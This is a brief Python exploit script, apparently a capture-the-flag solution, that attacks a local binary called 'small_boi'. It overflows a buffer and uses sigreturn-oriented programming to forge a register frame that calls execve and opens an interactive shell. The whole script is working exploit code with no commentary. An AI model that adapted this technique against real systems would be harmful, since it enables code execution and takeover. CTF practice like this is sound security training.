from ptrlib import *

sock = Process("./small_boi")
rop_pop_rax = 0x0040018a
rop_syscall_pop = 0x4001c5
addr_target = 0x601800

payload = b'A' * 0x28
payload += p64(rop_pop_rax)
payload += p64(15)
payload += p64(rop_syscall_pop)
payload += p64(0) * 5
payload += p64(0) * 8 # r8 - r15
payload += p64(0x400000 + 0x1ca) # rdi
payload += p64(0) # rsi
payload += p64(0) # rbp
payload += p64(0) # rbc
payload += p64(0) # rdx
payload += p64(59) # rax
payload += p64(0) # rcx
payload += p64(0x601800) # rsp
payload += p64(rop_syscall_pop) # rip
payload += p64(0) # eflags
payload += p64(0x33) # csgsfs
payload += p64(0) * 4
payload += p64(0) # fpstate
#payload += b'\x00' * (0x200 - len(payload))

assert len(payload) <= 0x200
sock.send(payload)

sock.interactive()
